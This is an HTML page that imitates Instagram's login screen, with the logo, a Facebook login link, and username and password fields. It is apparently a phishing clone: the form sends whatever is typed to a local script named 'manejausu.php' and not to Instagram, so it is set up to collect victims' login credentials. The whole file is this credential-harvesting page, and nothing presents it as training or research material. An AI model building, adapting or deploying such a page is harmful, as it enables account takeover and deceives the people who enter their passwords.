<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="icon" type="image/icon" href="resources/instaicon.ico" sizes="16x16"/>
    <link rel="stylesheet" href="resources/font-awesome-4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css?family=Almarai:300,400,700,800|Quicksand:300,400,500,600,700&display=swap" rel="stylesheet">
    <title>Instagram</title>
</head>
<body>
    <header>
        <table class="headtab">
            <tr class="brandDownload"> 
                <td> 
                    <h3>Instagram</h3>
                    <p>Download it for free.</p> 
                </td class="cent">
                <td></td>
                <td class="right"><a href="#" class="butGet">GET</a></td>
            </tr>
            <tr class="downline"> 
                <td> 
                <i class="fa fa-ellipsis-h colgrey hov fa-2x" aria-hidden="true"></i>
                </td>
                <td class="cent">
                    <a href="javascript:void(0)" class="colgrey">
                        English 
                        <i class="fa fa-chevron-down colgrey" ></i>
                    </a>  
                </td>
                <td></td>
            </tr>
        </table>
    </header>
    <form class="login" method="POST" action="manejausu.php">
        <img src="resources/instagramsvg.png" width="200px" class="centro" />
        <a class="facebook"><i class="fa fa-facebook-official" aria-hidden="true"></i> Continue with Facebook</a>
        <h2 class="colgrey">OR</h2>
        <input type="text" id="user" name="user" placeholder="Phone number, Username or Email" autocomplete="off"/>
        <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="off" class="merg-t"/>
        <input type="submit" value="Log In" class="facebook marg-t"/>
        <a class="fp">Forgot password?</a>
    </form>
    <footer>
        <table>
            <tr>
                <td class="cent">
                    <p class="colgrey fot-p">Don't have an account?  </p><a class="fot-p">Sign Up</a>
                </td>
            </tr>
        </table>        
    </footer>
</body>
</html>